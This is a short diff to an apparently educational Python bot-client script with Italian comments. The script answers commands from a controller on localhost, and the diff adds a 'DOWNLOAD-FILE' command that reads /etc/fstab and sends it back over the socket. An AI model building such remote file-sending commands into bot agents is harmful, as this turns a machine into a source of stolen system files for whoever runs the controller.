@@ -3,7 +3,7 @@
 import asyncio
 import bot_slave_utilities as bot_utils
 from datetime import datetime as dt
-
+# from functools import partial  # Per comodità leggiamo il file da inviare in chunk di dati
 
 HOST = "127.0.0.1"
 PORT = 9999
@@ -46,6 +46,8 @@ async def command_to_execute(writer: asyncio.StreamWriter, case: str) -> None:
                 user_data = f"Nome: {user.name}, Attivo da: {dt.fromtimestamp(user.started)}"
                 writer.write(user_data.encode())
                 await asyncio.sleep(1)
+        case 'DOWNLOAD-FILE':
+            await bot_utils.send_file("/etc/fstab", writer)  # TODO: Generalizza file
         case _:
             return "NULL"
 
